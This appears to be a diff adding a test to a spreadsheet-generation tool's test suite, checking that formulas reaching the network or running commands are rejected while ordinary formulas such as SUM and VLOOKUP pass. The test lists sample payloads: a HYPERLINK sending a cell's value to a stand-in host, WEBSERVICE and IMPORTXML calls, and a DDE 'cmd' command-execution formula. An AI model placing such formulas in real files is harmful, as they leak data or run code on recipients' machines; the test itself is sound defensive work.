@@ -69,6 +69,17 @@ describe("create_file", () => {
 		expect(fake.created[0]?.input).toMatchObject({ format: "docx", ext: "docx", layout: "abnt", title: "TCC" });
 	});
 
+	it("xlsx com fórmula de rede ou execução falha listando o que não é aceito; fórmula comum segue (auditoria F2, S4)", async () => {
+		const { fake, tool, ctx } = setup();
+		for (const formula of ['=HYPERLINK("http://x/?"&A1,"a")', '=WEBSERVICE("http://x")', '=IMPORTXML("http://x","//a")', "=cmd|' /C calc'!A0"]) {
+			const out = await tool("create_file").run({ filename: "p.xlsx", sheets: [{ rows: [["a", formula]] }] }, ctx);
+			expect(out).toMatchObject({ ok: false, error: expect.stringContaining("not accepted") });
+		}
+		expect(fake.created).toHaveLength(0);
+		const ok = await tool("create_file").run({ filename: "p.xlsx", sheets: [{ rows: [[1, 2, "=SUM(A1:B1)", '=IF(A1>1,VLOOKUP(A1,A:B,2,0),0)']] }] }, ctx);
+		expect(ok.ok).toBe(true);
+	});
+
 	it("xlsx recebe sheets e pptx recebe slides", async () => {
 		const { fake, tool, ctx } = setup();
 		const sheet = await tool("create_file").run({ filename: "preços.xlsx", sheets: [{ name: "Preços", columns: ["item", "valor"], rows: [["a", 1], ["b", "=B2*2"]] }] }, ctx);
